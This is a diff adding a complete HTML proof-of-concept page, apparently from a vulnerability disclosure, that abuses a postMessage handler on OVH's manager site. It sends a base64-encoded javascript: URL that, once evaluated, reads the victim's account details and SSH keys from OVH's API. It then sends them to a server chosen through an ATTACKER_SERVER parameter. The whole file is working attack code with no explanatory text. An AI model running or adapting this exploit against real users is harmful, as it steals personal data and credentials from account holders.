@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Postmessage PoC</title>
+    <script>
+      let ATTACKER_SERVER = new URLSearchParams(location.search).get(
+        "ATTACKER_SERVER"
+      );
+      let win = window.open("https://www.ovh.com/manager/");
+      let payload = btoa(`fetch("https://www.ovh.com/engine/apiv6/me/")
+  .then((response) => response.json())
+  .then((x) =>
+    fetch(
+      "${ATTACKER_SERVER}?userPII=" +
+        JSON.stringify(x)
+    )
+  );
+
+fetch("https://www.ovh.com/engine/apiv6/me/sshKey/")
+  .then((response) => response.json())
+  .then((keys) => {
+    keys.forEach((key) => {
+      fetch("https://www.ovh.com/engine/apiv6/me/sshKey/" + key)
+        .then((response2) => response2.json())
+        .then((key_value) =>
+          fetch(
+            "${ATTACKER_SERVER}?UserSshKey=" +
+              JSON.stringify(key_value)
+          )
+        );
+    });
+  });`);
+
+      let msg = {
+        id: "ovh-auth-redirect",
+        url: `javascript:eval(atob('${payload}'))//`,
+      };
+      setTimeout(function () {
+        win.postMessage(msg, "*");
+      }, 7000);
+
+    
+    </script>
+  </head>
+  <body></body>
+</html>
